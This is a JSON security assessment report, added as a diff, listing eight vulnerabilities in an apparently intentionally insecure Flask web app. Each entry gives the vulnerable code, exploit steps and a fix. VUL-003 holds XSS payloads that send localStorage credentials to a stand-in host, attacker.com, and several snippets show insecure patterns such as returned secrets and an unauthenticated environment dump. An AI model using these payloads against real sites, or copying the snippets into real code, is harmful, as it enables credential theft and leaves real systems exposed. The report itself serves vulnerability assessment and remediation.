@@ -1,0 +1,178 @@
+{
+  "report_metadata": {
+    "version": "pre-mitigation",
+    "generated_at": "2025-11-14T13:05:15.063014",
+    "report_type": "UI Security Assessment"
+  },
+  "vulnerabilities": [
+    {
+      "id": "VUL-001",
+      "name": "API Keys Exposed in Login Response",
+      "severity": "critical",
+      "cwe": "CWE-798: Use of Hard-Coded Credentials",
+      "description": "\n        API keys and other secrets are returned directly in the login API response\n        in plaintext JSON. This allows attackers to easily extract credentials\n        by intercepting or analyzing network traffic.\n        ",
+      "vulnerable_code": "/app/app.py - login() endpoint",
+      "vulnerable_snippet": "\n            return jsonify({\n                \"success\": True,\n                \"user\": username,\n                \"api_key\": API_KEY,\n                \"stripe_key\": STRIPE_KEY,\n            })\n        ",
+      "exploit_steps": [
+        "1. Send POST request to /login with valid credentials",
+        "2. Capture response JSON",
+        "3. Extract api_key, stripe_key, service_account from response",
+        "4. Use extracted credentials to access protected resources"
+      ],
+      "expected_result": "Login should succeed with user session",
+      "actual_result": "Login response contains hardcoded API keys in plaintext",
+      "impact": "Complete compromise of API credentials leading to unauthorized access",
+      "remediation": "Never return secrets in API responses; use environment variables",
+      "test_url": "POST /login",
+      "test_payload": "{\"username\": \"admin\", \"password\": \"password123\"}"
+    },
+    {
+      "id": "VUL-002",
+      "name": "Secrets Embedded in Frontend JavaScript",
+      "severity": "critical",
+      "cwe": "CWE-95: Improper Neutralization of Directives in Dynamically Evaluated Code",
+      "description": "\n        API keys, Stripe keys, and other sensitive credentials are hardcoded in\n        HTML templates as JavaScript variables. These are visible in browser\n        DevTools, page source, and browser history.\n        ",
+      "vulnerable_code": "/templates/dashboard.html",
+      "vulnerable_snippet": "\n            <script>\n            const API_KEY = \"{{ api_key }}\";\n            const STRIPE_KEY = \"{{ stripe_key }}\";\n            console.log('API Key:', API_KEY);\n            </script>\n        ",
+      "exploit_steps": [
+        "1. Navigate to /dashboard after login",
+        "2. Open browser DevTools (F12)",
+        "3. Check JavaScript console for hardcoded secrets",
+        "4. Check page source for unescaped credentials",
+        "5. Retrieve all API keys from frontend code"
+      ],
+      "expected_result": "No secrets in frontend code",
+      "actual_result": "API keys, Stripe keys visible in page source and console",
+      "impact": "Secrets accessible to any user viewing page source or using DevTools",
+      "remediation": "NEVER embed secrets in frontend code; use secure backend endpoints",
+      "test_url": "GET /dashboard",
+      "evidence_location": "Browser console and page source"
+    },
+    {
+      "id": "VUL-003",
+      "name": "Unsafe File Preview - DOM XSS Vulnerability",
+      "severity": "critical",
+      "cwe": "CWE-79: Improper Neutralization of Input During Web Page Generation",
+      "description": "\n        The file preview endpoint accepts user input and directly renders it in\n        HTML without sanitization. This allows attackers to inject malicious\n        JavaScript that will execute in the victim's browser.\n        ",
+      "vulnerable_code": "/app/app.py - preview_file() endpoint",
+      "vulnerable_snippet": "\n            return jsonify({\n                \"html\": f'''<div id=\"content\">{file_content}</div>\n                <script>document.getElementById('content').innerHTML = `{file_content}`;</script>'''\n            })\n        ",
+      "exploit_steps": [
+        "1. Prepare XSS payload: '<img src=x onerror=\"fetch('http://attacker.com?key=' + localStorage.api_key)\">'",
+        "2. POST to /api/preview-file with payload as 'content' parameter",
+        "3. Payload executes in response HTML",
+        "4. Attacker receives victim's stored credentials via request"
+      ],
+      "expected_result": "Safe preview of file content",
+      "actual_result": "Arbitrary JavaScript executes, allowing credential theft",
+      "payload": "<img src=x onerror=\"alert('XSS'); fetch('http://attacker.com/steal')\">",
+      "impact": "Session hijacking, credential theft, malware injection",
+      "remediation": "Sanitize all user input using MarkupSafe.escape() or similar",
+      "test_url": "POST /api/preview-file"
+    },
+    {
+      "id": "VUL-004",
+      "name": "Client-Side Logging of Sensitive Information",
+      "severity": "high",
+      "cwe": "CWE-532: Insertion of Sensitive Information into Log File",
+      "description": "\n        Sensitive information including API keys, passwords, and session tokens\n        are logged to the browser console using console.log(). This information\n        can be viewed by any developer tool user or captured in browser logs.\n        ",
+      "vulnerable_code": "/templates/login.html, /templates/dashboard.html",
+      "vulnerable_snippet": "\n            console.log('Login attempt:', {\n                username: username,\n                password: password\n            });\n            console.log('API Key:', API_KEY);\n            console.log('LocalStorage:', localStorage);\n        ",
+      "exploit_steps": [
+        "1. Navigate to login page",
+        "2. Open DevTools Console (F12)",
+        "3. Attempt login",
+        "4. View console output showing credentials and secrets",
+        "5. Credentials remain in browser history"
+      ],
+      "expected_result": "No sensitive data in console logs",
+      "actual_result": "Credentials, API keys, and session data logged to console",
+      "impact": "Sensitive data accessible in browser logs and developer tools",
+      "remediation": "Remove all console.log() statements containing sensitive data",
+      "test_url": "GET /login, POST /login"
+    },
+    {
+      "id": "VUL-005",
+      "name": "Debug Endpoint Exposing All System Information",
+      "severity": "critical",
+      "cwe": "CWE-209: Information Exposure Through an Error Message",
+      "description": "\n        An unauthenticated /api/debug-info endpoint returns complete system\n        information including all secrets, environment variables, Python version,\n        working directory, and all application configuration.\n        ",
+      "vulnerable_code": "/app/app.py - debug_info() endpoint",
+      "vulnerable_snippet": "\n            @app.route('/api/debug-info')\n            def debug_info():\n                return jsonify({\n                    \"all_secrets\": { \"api_key\": API_KEY, ... },\n                    \"app_config\": dict(app.config),\n                    \"environment\": dict(os.environ)\n                })\n        ",
+      "exploit_steps": [
+        "1. Send GET request to /api/debug-info (no authentication required)",
+        "2. Response contains all secrets in JSON format",
+        "3. Extract all API keys, database passwords, and config",
+        "4. Use credentials for further attacks"
+      ],
+      "expected_result": "Endpoint should not exist or require authentication",
+      "actual_result": "Complete system information exposed without authentication",
+      "impact": "Complete system compromise through information disclosure",
+      "remediation": "Remove all debug endpoints from production code",
+      "test_url": "GET /api/debug-info"
+    },
+    {
+      "id": "VUL-006",
+      "name": "Source Code Disclosure",
+      "severity": "high",
+      "cwe": "CWE-534: Information Exposure Through Debug Log Output",
+      "description": "\n        An /api/source-code endpoint returns the full source code of the\n        application, including all hardcoded credentials and implementation details.\n        ",
+      "vulnerable_code": "/app/app.py - source_code() endpoint",
+      "exploit_steps": [
+        "1. Send GET request to /api/source-code",
+        "2. Receive complete application source code",
+        "3. Extract all hardcoded credentials from code",
+        "4. Identify other vulnerabilities from code review"
+      ],
+      "expected_result": "Source code should not be accessible via web",
+      "actual_result": "Complete source code returned in JSON response",
+      "impact": "Source code review enables targeted attacks and credential extraction",
+      "remediation": "Never expose application source code through web endpoints",
+      "test_url": "GET /api/source-code"
+    },
+    {
+      "id": "VUL-007",
+      "name": "Stack Trace and Error Information Leakage",
+      "severity": "high",
+      "cwe": "CWE-209: Information Exposure Through an Error Message",
+      "description": "\n        Error responses include full Python stack traces and system information,\n        allowing attackers to understand the application architecture and identify\n        further vulnerabilities.\n        ",
+      "vulnerable_code": "/app/app.py - handle_errors decorator",
+      "vulnerable_snippet": "\n            except Exception as e:\n                return jsonify({\n                    \"error\": str(e),\n                    \"traceback\": traceback.format_exc(),\n                    \"debug_info\": { \"python_version\": ..., \"env_vars\": ... }\n                })\n        ",
+      "exploit_steps": [
+        "1. Send malformed request to trigger error",
+        "2. Response includes full Python traceback",
+        "3. Response includes system info and environment variables",
+        "4. Use information for further reconnaissance"
+      ],
+      "expected_result": "Generic error message without details",
+      "actual_result": "Detailed stack trace and system info in error responses",
+      "impact": "System reconnaissance and attack planning",
+      "remediation": "Return generic error messages; log details server-side only"
+    },
+    {
+      "id": "VUL-008",
+      "name": "Database Credentials in Session and Responses",
+      "severity": "critical",
+      "cwe": "CWE-798: Use of Hard-Coded Credentials",
+      "description": "\n        Database passwords and other sensitive credentials are stored in\n        user sessions and returned in API responses, making them accessible\n        to attackers via session hijacking or response interception.\n        ",
+      "vulnerable_code": "/app/app.py - login() endpoint",
+      "vulnerable_snippet": "\n            session['db_pass'] = DATABASE_PASSWORD\n            return jsonify({\n                \"database_password\": DATABASE_PASSWORD,\n                \"session_data\": dict(session)\n            })\n        ",
+      "exploit_steps": [
+        "1. Authenticate to application",
+        "2. Call /api/user-data to get session data",
+        "3. Extract database password from session",
+        "4. Use database credentials for direct database access"
+      ],
+      "expected_result": "No database credentials in session or responses",
+      "actual_result": "Database passwords returned in API responses",
+      "impact": "Direct database access and complete data compromise",
+      "remediation": "Never store or transmit database credentials to frontend"
+    }
+  ],
+  "summary": {
+    "total_vulnerabilities": 8,
+    "critical": 5,
+    "high": 3,
+    "medium": 0,
+    "low": 0
+  }
+}
